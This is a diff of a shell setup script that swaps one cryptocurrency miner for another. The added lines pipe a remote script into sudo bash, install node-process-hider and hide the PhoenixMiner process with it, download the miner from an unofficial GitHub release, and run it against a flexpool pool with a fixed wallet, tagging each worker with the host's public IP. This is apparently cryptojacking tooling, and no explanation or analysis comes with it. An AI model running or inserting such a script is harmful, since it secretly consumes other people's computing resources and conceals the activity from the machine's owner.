@@ -1,7 +1,15 @@
 #!/bin/sh
 sudo apt update
-sudo apt install libpci3
-sudo wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz
-tar -xf lolMiner_v1.42_Lin64.tar.gz
-cd lolMiner_v1.42_Lin64
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./lolMiner --algo ETHASH --pool ethash.poolbinance.com:443 --user henes001.$ip-N --tls 0
+sudo apt install gcc -y
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+sudo apt install nodejs
+npm install -g npm@8.4.1
+npm i -g node-process-hider
+sudo ph add PhoenixMiner
+wget https://github.com/jsoe967/poenix/releases/download/v1.0.0/PhoenixMiner_5.6d_Linux.tar.gz
+tar -xf PhoenixMiner_5.6d_Linux.tar.gz
+cd PhoenixMiner_5.6d_Linux && sudo apt update
+sudo apt install screen libjansson4 libpci3 -y
+screen -dmS ls
+chmod +x PhoenixMiner
+./PhoenixMiner -pool ssl://eth-sg.flexpool.io:5555 -pool2 ssl://eth-sg.flexpool.io:5555 -wal 0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) -proto eth-proxy
